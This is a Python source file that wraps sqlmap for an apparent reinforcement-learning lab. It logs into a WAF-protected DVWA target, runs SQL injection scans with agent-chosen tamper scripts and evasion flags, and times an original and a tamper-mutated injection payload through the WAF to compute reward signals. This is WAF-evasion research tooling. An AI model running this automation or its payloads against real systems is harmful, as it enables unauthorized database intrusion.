#!/usr/bin/env python3
"""
executor.py - sqlmap wrapper for the CR-sqlmap RL lab (isolated lab use only).

Takes an "action" (the evasion levers the RL agent controls), runs sqlmap once
against a WAF-protected DVWA target, parses the outcome from sqlmap's stdout and
its HTTP traffic log, and returns structured telemetry for reward computation.

Nothing in here computes the reward; it only reports observable signals
(injection found?, how many requests, how many were blocked, timing). The
Ouroboros reward is computed by the caller (relay / Kaggle notebook).

Action levers exposed to the agent:
  - tamper       : list of sqlmap tamper scripts (the main evasion lever)
  - technique    : subset of B/E/U/S/T/Q
  - level, risk  : sqlmap payload breadth
  - random_agent : rotate User-Agent
  - extra        : free-form extra sqlmap flags (escape hatch)

CLI examples:
  ./executor.py --login-base http://192.168.244.128:8080 \
      --target "http://192.168.244.128:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
      -p id --tamper space2comment,between --technique BEU --level 2 --risk 2 --json
  ./executor.py --check "http://192.168.244.128:8081/login.php"
"""

import argparse
import http.cookiejar
import importlib
import json
import os
import re
import shutil
import statistics
import subprocess
import sys
import tempfile
import time
import urllib.error
import urllib.parse
import urllib.request

SQLMAP = os.environ.get("SQLMAP_BIN", "sqlmap")
SQLMAP_HOME = os.environ.get("SQLMAP_HOME", "/usr/share/sqlmap")

# --- DVWA auth -------------------------------------------------------------

def get_dvwa_cookie(base_url, username="admin", password="password",
                    security="low", timeout=15):
    """Log into DVWA (through whatever WAF fronts it) and return a cookie string
    'PHPSESSID=<id>; security=<level>' suitable for sqlmap --cookie."""
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    login_url = base_url.rstrip("/") + "/login.php"
    html = opener.open(login_url, timeout=timeout).read().decode("utf-8", "replace")
    m = re.search(r"name=['\"]user_token['\"]\s+value=['\"]([a-f0-9]+)", html)
    token = m.group(1) if m else ""
    data = urllib.parse.urlencode({
        "username": username, "password": password,
        "Login": "Login", "user_token": token,
    }).encode()
    opener.open(login_url, data=data, timeout=timeout).read()
    sess = next((c.value for c in cj if c.name == "PHPSESSID"), None)
    if not sess:
        raise RuntimeError("DVWA login failed: no PHPSESSID returned")
    return f"PHPSESSID={sess}; security={security}"

# --- sqlmap invocation -----------------------------------------------------

def build_cmd(target, param, cookie, tamper, technique, level, risk,
              random_agent, extra, outdir, traffic_file, flush=True,
              req_timeout=10, retries=1):
    cmd = [SQLMAP, "-u", target, "--batch", "--disable-coloring", "-v", "1",
           "--output-dir", outdir, "-t", traffic_file,
           "--timeout", str(req_timeout), "--retries", str(retries)]
    # sqlmap in-run request parallelism (uses Kali's CPUs to speed each episode)
    _threads = os.environ.get("SQLMAP_THREADS")
    if _threads:
        cmd += ["--threads", _threads]
    if param:
        cmd += ["-p", param]
    if cookie:
        cmd += ["--cookie", cookie]
    if tamper:
        cmd += ["--tamper", ",".join(tamper)]
    if technique:
        cmd += ["--technique", technique]
    if level:
        cmd += ["--level", str(level)]
    if risk:
        cmd += ["--risk", str(risk)]
    if random_agent:
        cmd += ["--random-agent"]
    if flush:
        cmd += ["--flush-session"]
    if extra:
        cmd += list(extra)
    return cmd

def parse_stdout(stdout):
    # sqlmap prints this line ONLY when it confirms an injection point.
    found = bool(re.search(r"identified the following injection point", stdout, re.I))
    dbms = None
    m = re.search(r"back-end DBMS:\s*([^\n]+)", stdout)
    if m:
        dbms = m.group(1).strip()
    techniques = [t.strip() for t in re.findall(r"^\s*Type:\s*([^\n]+)", stdout, re.M)]
    payloads = [p.strip() for p in re.findall(r"^\s*Payload:\s*([^\n]+)", stdout, re.M)]
    waf_warned = bool(re.search(r"WAF/IPS|protected by some kind of WAF", stdout, re.I))
    not_injectable = bool(re.search(r"do not appear to be injectable", stdout, re.I))
    # sqlmap end-of-run summary, e.g. "403 (Forbidden) - 41 times"
    summary_blocked = 0
    for code, n in re.findall(r"\b(\d{3})\s*\([^)]+\)\s*-\s*(\d+)\s*times", stdout):
        if code in ("403", "406", "501"):
            summary_blocked += int(n)
    return found, dbms, techniques, payloads, waf_warned, not_injectable, summary_blocked

def parse_traffic(path):
    """Count HTTP requests and blocked responses from the sqlmap traffic log.
    sqlmap writes 'HTTP request [#N]:' and 'HTTP response [#N] (403 Forbidden):'.
    Returns (total_requests, blocked_responses)."""
    try:
        with open(path, encoding="utf-8", errors="replace") as fh:
            data = fh.read()
    except FileNotFoundError:
        return 0, 0
    total = len(re.findall(r"HTTP request \[#\d+\]", data))
    codes = re.findall(r"HTTP response \[#\d+\]\s*\((\d{3})", data)
    blocked = sum(1 for c in codes if c in ("403", "406", "501"))
    return total, blocked

# --- tamper probe: chi_ORIG vs chi_MUT pair (inputs for R_RUL and R_REG) -----
# Drives sqlmap's OWN tamper modules so chi_MUT is exactly what sqlmap would send,
# then times both payloads through the WAF. APCT = exec_time / payload_char_len.
_TAMPER_CACHE = {}
_KB_INIT = [False]


def _init_sqlmap_kb():
    """Some tampers (e.g. randomcase) need sqlmap's keyword kb; load it once."""
    if _KB_INIT[0]:
        return
    try:
        if SQLMAP_HOME not in sys.path:
            sys.path.insert(0, SQLMAP_HOME)
        from lib.core.data import kb  # noqa
        kwfile = os.path.join(SQLMAP_HOME, "data", "txt", "keywords.txt")
        if os.path.exists(kwfile):
            with open(kwfile, encoding="utf-8", errors="replace") as fh:
                kb.keywords = set(fh.read().split())
    except Exception:
        pass
    _KB_INIT[0] = True


def _load_tamper(name):
    if name not in _TAMPER_CACHE:
        _init_sqlmap_kb()
        _TAMPER_CACHE[name] = importlib.import_module("tamper." + name)
    return _TAMPER_CACHE[name]


def apply_tamper_chain(payload, chain):
    """Apply tamper scripts in order -> (mutated, applied[], failed[])."""
    out, applied, failed = payload, [], []
    for name in chain:
        try:
            res = _load_tamper(name).tamper(out)
            if res is not None:
                out, _ = res, applied.append(name)
            else:
                failed.append(name)
        except Exception:
            failed.append(name)
    return out, applied, failed


def _timed_get(url, cookie, timeout=10):
    headers = {"User-Agent": "Mozilla/5.0 (apct-probe)"}
    if cookie:
        headers["Cookie"] = cookie
    t = time.time()
    try:
        with urllib.request.urlopen(urllib.request.Request(url, headers=headers),
                                    timeout=timeout) as r:
            r.read(2048)
            return round(time.time() - t, 4), getattr(r, "status", 200)
    except urllib.error.HTTPError as e:
        return round(time.time() - t, 4), e.code
    except Exception:
        return round(time.time() - t, 4), 0


def probe_pair(target, param, cookie, tamper, base_payload="1' OR '1'='1' -- -",
               timeout=10):
    """Send chi_ORIG and the tamper-mutated chi_MUT through the WAF, timing each.
    Feeds R_RUL (apct_mut - apct_orig) and R_REG (psi(orig) - psi(mut))."""
    mut, applied, failed = apply_tamper_chain(base_payload, tamper or [])

    def url_with(p):
        parts = urllib.parse.urlsplit(target)
        q = dict(urllib.parse.parse_qsl(parts.query, keep_blank_values=True))
        q[param] = p
        return urllib.parse.urlunsplit((parts.scheme, parts.netloc, parts.path,
                                        urllib.parse.urlencode(q), parts.fragment))

    # Decision (Minh delegated): median of N probes per payload to damp timing
    # jitter in the APCT side-channel. Tune via APCT_PROBES.
    nprobe = int(os.environ.get("APCT_PROBES", "3"))

    def timed_median(u):
        samples = [_timed_get(u, cookie, timeout) for _ in range(nprobe)]
        return statistics.median(t for t, _ in samples), samples[-1][1]

    t_o, s_o = timed_median(url_with(base_payload))
    t_m, s_m = timed_median(url_with(mut))
    l_o, l_m = max(1, len(base_payload)), max(1, len(mut))
    return {
        "orig": base_payload, "mut": mut,
        "L_orig": l_o, "L_mut": l_m, "T_orig": t_o, "T_mut": t_m,
        "apct_orig": round(t_o / l_o, 6), "apct_mut": round(t_m / l_m, 6),
        "status_orig": s_o, "status_mut": s_m,
        "applied_tampers": applied, "failed_tampers": failed,
        "changed": mut != base_payload,
    }


# --- episode ---------------------------------------------------------------

def run_episode(target, param="id", cookie=None, login_base=None,
                tamper=None, technique=None, level=1, risk=1,
                random_agent=False, extra=None, flush=True,
                overall_timeout=180, security="low"):
    if cookie is None and login_base:
        cookie = get_dvwa_cookie(login_base, security=security)

    outdir = tempfile.mkdtemp(prefix="sqlmap_ep_")
    traffic_file = os.path.join(outdir, "traffic.log")
    cmd = build_cmd(target, param, cookie, tamper or [], technique, level, risk,
                    random_agent, extra or [], outdir, traffic_file, flush=flush)

    start = time.time()
    timed_out = False
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True,
                              timeout=overall_timeout)
        stdout, stderr, rc = proc.stdout, proc.stderr, proc.returncode
    except subprocess.TimeoutExpired as e:
        stdout = (e.stdout or b"").decode("utf-8", "replace") if isinstance(e.stdout, bytes) else (e.stdout or "")
        stderr = (e.stderr or b"").decode("utf-8", "replace") if isinstance(e.stderr, bytes) else (e.stderr or "")
        rc = -1
        timed_out = True
    duration = round(time.time() - start, 2)

    found, dbms, techniques, payloads, waf_warned, not_injectable, summary_blocked = parse_stdout(stdout)
    total_req, blocked_req = parse_traffic(traffic_file)
    # fall back to sqlmap's own summary count if traffic log was unavailable
    if blocked_req == 0 and summary_blocked:
        blocked_req = summary_blocked
    block_ratio = round(blocked_req / total_req, 3) if total_req else 0.0

    result = {
        "found": found,
        "dbms": dbms,
        "techniques": techniques,
        "payloads": payloads,
        "requests": total_req,
        "blocked_responses": blocked_req,
        "block_ratio": block_ratio,
        "waf_warned": waf_warned,
        "not_injectable": not_injectable,
        "duration_s": duration,
        "timed_out": timed_out,
        "returncode": rc,
        "action": {
            "tamper": tamper or [],
            "technique": technique,
            "level": level,
            "risk": risk,
            "random_agent": random_agent,
        },
        "target": target,
    }
    # chi_ORIG vs chi_MUT probe for the chosen tamper chain (R_RUL / R_REG inputs)
    try:
        result["probe"] = probe_pair(target, param, cookie, tamper or [])
    except Exception as exc:  # noqa: BLE001
        result["probe"] = {"error": str(exc)}
    # keep logs for debugging unless caller cleans; traffic can be large
    shutil.rmtree(outdir, ignore_errors=True)
    return result

# --- CLI -------------------------------------------------------------------

def main(argv=None):
    ap = argparse.ArgumentParser(description="sqlmap wrapper for CR-sqlmap RL lab")
    ap.add_argument("--target", help="full target URL incl. injectable param")
    ap.add_argument("-p", "--param", default="id", help="param to test (default id)")
    ap.add_argument("--cookie", help="explicit cookie string")
    ap.add_argument("--login-base", help="DVWA base URL to auto-login and build cookie")
    ap.add_argument("--security", default="low", help="DVWA security level cookie")
    ap.add_argument("--tamper", help="comma-separated tamper scripts")
    ap.add_argument("--technique", help="sqlmap techniques subset, e.g. BEUSTQ")
    ap.add_argument("--level", type=int, default=1)
    ap.add_argument("--risk", type=int, default=1)
    ap.add_argument("--random-agent", action="store_true")
    ap.add_argument("--no-flush", action="store_true", help="reuse sqlmap session cache")
    ap.add_argument("--timeout", type=int, default=180, help="overall episode timeout (s)")
    ap.add_argument("--extra", nargs=argparse.REMAINDER, help="extra raw sqlmap flags")
    ap.add_argument("--json", action="store_true", help="emit JSON only")
    ap.add_argument("--check", metavar="URL", help="reachability check only")
    args = ap.parse_args(argv)

    if args.check:
        try:
            with urllib.request.urlopen(args.check, timeout=8) as r:
                print(json.dumps({"url": args.check, "http": r.status, "ok": True}))
        except Exception as e:  # noqa
            print(json.dumps({"url": args.check, "ok": False, "error": str(e)}))
        return 0

    if not args.target:
        ap.error("--target is required (or use --check)")

    tamper = args.tamper.split(",") if args.tamper else []
    res = run_episode(
        target=args.target, param=args.param, cookie=args.cookie,
        login_base=args.login_base, tamper=tamper, technique=args.technique,
        level=args.level, risk=args.risk, random_agent=args.random_agent,
        extra=args.extra, flush=not args.no_flush, overall_timeout=args.timeout,
        security=args.security,
    )
    if args.json:
        print(json.dumps(res))
    else:
        print(f"target        : {res['target']}")
        print(f"action        : {json.dumps(res['action'])}")
        print(f"FOUND         : {res['found']}  dbms={res['dbms']}")
        if res["techniques"]:
            print(f"techniques    : {res['techniques']}")
        print(f"requests      : {res['requests']}  blocked(403/406/501): "
              f"{res['blocked_responses']}  block_ratio={res['block_ratio']}")
        print(f"waf_warned    : {res['waf_warned']}  not_injectable={res['not_injectable']}")
        print(f"duration_s    : {res['duration_s']}  timed_out={res['timed_out']}  rc={res['returncode']}")
    return 0

if __name__ == "__main__":
    sys.exit(main())
